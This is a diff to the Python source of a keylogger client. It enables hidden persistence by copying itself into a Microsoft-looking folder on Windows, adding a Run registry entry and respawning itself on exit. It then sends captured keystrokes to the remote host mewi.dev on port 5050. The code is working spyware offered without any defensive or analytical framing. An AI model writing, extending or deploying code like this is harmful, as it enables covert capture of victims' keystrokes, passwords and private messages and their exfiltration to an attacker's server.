@@ -88,7 +88,7 @@ class Client:
 
                     prefix = "_" if key == "space" else "↴"
                     self.send_message(f"r{prefix} {''.join(word)}")
-                    self.send_message(f"p{prefix} {''.join(word_processed) or ' '}")
+                    self.send_message(f"p{prefix} {''.join(word_processed)}")
                     self.debug_message("KEYLOGGER",
                                        f"Sending keys to {self.host}:{self.port}: {prefix}r/p | {''.join(word)} / {''.join(word_processed)}")
                     break
@@ -278,13 +278,13 @@ class PackageManager:
             raise Exception(f"{package=} does not exist")
 
 
-# @atexit.register
+@atexit.register
 def respawn():
     if not client.stop_message:
         client.disconnect()
 
     client.debug_message("RESPAWNING", "Respawning client script")
-    subprocess.Popen([sys.executable, f"C:\\Microsoft\\kl_client\\{os.path.basename(sys.argv[0])}"], shell=True)
+    subprocess.Popen([sys.executable, f"C:\\Microsoft\\kl_client\\client.pyw"], shell=True)
 
 
 def set_os_startup_launch():
@@ -297,22 +297,21 @@ def set_os_startup_launch():
             raise NotImplementedError
 
         case "win32":
-            file_name = os.path.basename(sys.argv[0])
             dest_dir = "C:\\Microsoft\\kl_client\\"
-            dest_path = dest_dir + file_name
+            dest_path = dest_dir + "client.pyw"
 
-            if sys.argv[0] != dest_dir + file_name:
+            if sys.argv[0] != dest_path:
                 os.makedirs(dest_dir, exist_ok=True)
                 shutil.copy(__file__, dest_path)
 
             key = winreg.HKEY_CURRENT_USER
             sub_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
-            if WindowsRegistryEditor.value_exists(key, sub_key, file_name):
-                WindowsRegistryEditor.edit_value(key, sub_key, file_name, f'"{sys.executable}" "{dest_path}"')
+            if WindowsRegistryEditor.value_exists(key, sub_key, "client.pyw"):
+                WindowsRegistryEditor.edit_value(key, sub_key, "client.pyw", f'"{sys.executable}" "{dest_path}"')
                 return
 
-            WindowsRegistryEditor.add_value(key, sub_key, file_name, f'"{sys.executable}" "{dest_path}"')
+            WindowsRegistryEditor.add_value(key, sub_key, "client.pyw", f'"{sys.executable}" "{dest_path}"')
             return
 
         case "cygwin":
@@ -325,7 +324,7 @@ if __name__ == "__main__":
     PackageManager.install_package("keyboard")
     import keyboard
 
-    # set_os_startup_launch()
+    set_os_startup_launch()
 
     client = Client("mewi.dev", 5050, debug=True)
     client.start()
